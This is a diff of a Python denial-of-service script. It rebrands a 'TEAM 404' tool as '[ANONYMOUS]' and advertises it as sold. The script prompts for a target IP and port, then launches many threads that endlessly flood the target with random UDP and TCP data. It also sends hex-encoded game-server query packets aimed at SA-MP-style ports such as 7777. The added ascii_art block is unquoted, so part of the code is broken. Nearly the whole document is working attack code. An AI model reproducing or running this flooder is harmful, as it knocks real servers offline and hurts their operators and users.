@@ -1,93 +1,64 @@
 import random
-import socket
 import threading
-import os
+import codecs
 import time
+import socket
+import sys
+import os
 
-# ----------- Colors -----------
-BLUE = '\033[94m'
-GRAY = '\033[90m'
-MIROU = '\033[0m'
-GREEN = '\033[92m'
+# تنظيف الشاشة
+os.system("clear")
 
-# ----------- Clear Screen -----------
-def clear():
-    os.system("cls" if os.name == "nt" else "clear")
+# تدرج لوني: بنفسجي إلى سماوي
+gradient_colors = [165, 135, 99, 63, 69, 75, 81, 87, 123, 159, 195]
 
-# ----------- Animated Hacker dev 404 -----------
-def hacker_background(duration=10):
-    width = 70
-    symbols = ['0', '1', '▒', '▓', '█', '░', '▓', '█', '▒', '1', '0']
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        line = ''.join(random.choice(symbols) for _ in range(width))
-        print(BLUE + line + MIROU)
-        time.sleep(0.05)
-        print("\033[F", end='')  # Move cursor up to overwrite the line
+ascii_art = [
+  ██╗░░██╗░ ╚██╗██╔╝ ░╚███╔╝░ ░██╔██╗░░ ██╔╝╚██╗░ ╚═╝░░╚═╝░  ░
+]
 
-# ----------- Large 404 Logo -----------
-def print_404_logo():
-    logo = f"""
-{BLUE}
-                        ██╗░░██╗░
-                        ╚██╗██╔╝
-                        ░╚███╔╝░
-                        ░██╔██╗░░
-                       ██╔╝╚██╗░
-                       ╚═╝░░╚═╝░  ░{MIROU}
-"""
-    print(logo)
+# طباعة الفن بتدرج لوني
+def print_gradient_art(art_lines, colors):
+    for i, line in enumerate(art_lines):
+        color_code = colors[i % len(colors)]
+        print(f"\033[38;5;{color_code}m{line}\033[0m")
 
-# ----------- 404 Logo Animation (Repeat Layers) -----------
-def animate_404_logo(times=5):
-    for _ in range(times):
-        clear()
-        hacker_background(duration=1)
-        print_404_logo()
-        time.sleep(0.5)
-        clear()
+print_gradient_art(ascii_art, gradient_colors)
+print()
 
-# ----------- Login Screen -----------
-def login_screen():
-    attempts = 0
-    max_attempts = 5
-    clear()
-    print(BLUE + "\n🔐 Login to  𝙏𝙀𝘼𝙈 404 System\n" + MIROU)
-    while attempts < max_attempts:
-        username = input(GREEN + "👤 Username: " + MIROU)
-        password = input(GREEN + "🔑 Password: " + MIROU)
-        if username == 'MIROU' and password == '404':
-            print(GREEN + "\n✅ Access granted! Welcome to 𝙏𝙀𝘼𝙈 404.\n" + MIROU)
-            time.sleep(1)
-            clear()
-            animate_404_logo()
-            return True
-        else:
-            attempts += 1
-            print(GRAY + f"❌ Incorrect credentials. Attempts left: {max_attempts - attempts}\n" + MIROU)
-            time.sleep(1)
-            clear()
-            print(BLUE + "\n🔐 Login to 𝙏𝙀𝘼𝙈 404 System\n" + MIROU)
-    print(BLUE + "🚫 Too many failed attempts. Exiting..." + MIROU)
-    return False
+# إدخال البيانات
+ip = str(input("Target Ip:"))
+port = int(input("Target Port:"))
+choice = str(input("Thb Tnik Serveur? (y/n):"))
+times = int(input("Packet:"))
+threads = int(input("Threads:"))
+fake_ip = '182.21.20.32'
 
-# ----------- Attack Functions -----------
+Pacotes = [
+    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
+    codecs.decode("081e62da", "hex_codec"),
+    codecs.decode("081e77da", "hex_codec"),
+    codecs.decode("081e4dda", "hex_codec"),
+    codecs.decode("021efd40", "hex_codec"),
+    codecs.decode("081e7eda", "hex_codec")
+]
+
 def run():
-    data = random._urandom(1024)
-    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
+    data = random._urandom(1460)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             addr = (str(ip), int(port))
             for x in range(times):
                 s.sendto(data, addr)
-            print(i + BLUE + " Server down by team 404!!" + MIROU)
+            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
         except:
-            print(GRAY + "[!] RAY7 YDNAK SIRVR BY MIROU" + MIROU)
+            print("[ANONYMOUS] STRIKES BACK!")
 
 def run2():
-    data = random._urandom(999)
-    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
+    data = random._urandom(1204)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -95,14 +66,13 @@ def run2():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i + BLUE + " RAH TNAK SIRVR BY TIM 404" + MIROU)
+            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
         except:
             s.close()
-            print(GRAY + "[*] RAY7 YDNAK SIRVR BY MIROU" + MIROU)
+            print("[ANONYMOUS] STRIKES BACK!")
 
 def run3():
-    data = random._urandom(818)
-    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
+    data = random._urandom(999)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -110,14 +80,13 @@ def run3():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i + BLUE + " RAH TNAK SIRVR BY TIM 404" + MIROU)
+            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
         except:
             s.close()
-            print(GRAY + "[*] RAY7 YDNAK SIRVR BY MIROU" + MIROU)
+            print("[ANONYMOUS] ynikom!")
 
 def run4():
-    data = random._urandom(16)
-    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
+    data = random._urandom(818)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -125,34 +94,54 @@ def run4():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i + BLUE + " RAH TNAK SIRVR BY TIM 404" + MIROU)
+            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
         except:
             s.close()
-            print(GRAY + "[*] RAY7 YDNAK SIRVR BY MIROU" + MIROU)
+            print("[ANONYMOUS] is back!")
 
-# ----------- Main Program -----------
-if __name__ == "__main__":
-    clear()
-    if login_screen():
-        print(BLUE + """
-                     For Sell TOOLS : 404
- TEAM 404 IS BACK                                                        
-""" + MIROU)
+def run5():
+    data = random._urandom(16)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
+        except:
+            s.close()
+            print("[ANONYMOUS] Anonaymous ynikom!")
 
-        ip = input(BLUE + " Target IP : " + MIROU)
-        port = int(input(BLUE + " Target Port : " + MIROU))
-        choice = input(BLUE + " Use multiple attack methods? (y/n) : " + MIROU).lower()
-        times = int(input(BLUE + " Time (packets per cycle): " + MIROU))
-        threads = int(input(BLUE + " Threads : " + MIROU))
+class MyThread(threading.Thread):
+    def run(self):
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            msg = Pacotes[random.randrange(0, 5)]
+            sock.sendto(msg, (ip, int(port)))
+            if int(port) == 7777:
+                sock.sendto(Pacotes[5], (ip, int(port)))
+            elif int(port) == 7796:
+                sock.sendto(Pacotes[4], (ip, int(port)))
+            elif int(port) == 7771:
+                sock.sendto(Pacotes[6], (ip, int(port)))
+            elif int(port) == 7784:
+                sock.sendto(Pacotes[7], (ip, int(port)))
 
-        for y in range(threads):
-            if choice == 'y':
-                th = threading.Thread(target=run)
-                th.start()
-                th = threading.Thread(target=run2)
-                th.start()
-                th = threading.Thread(target=run3)
-                th.start()
-            else:
-                th = threading.Thread(target=run4)
-                th.start()
+if __name__ == '__main__':
+    try:
+        for x in range(200):
+            mythread = MyThread()
+            mythread.start()
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+for y in range(threads):
+    if choice == 'y':
+        threading.Thread(target=run).start()
+        threading.Thread(target=run2).start()
+        threading.Thread(target=run3).start()
+        threading.Thread(target=run4).start()
+    else:
+        threading.Thread(target=run5).start()
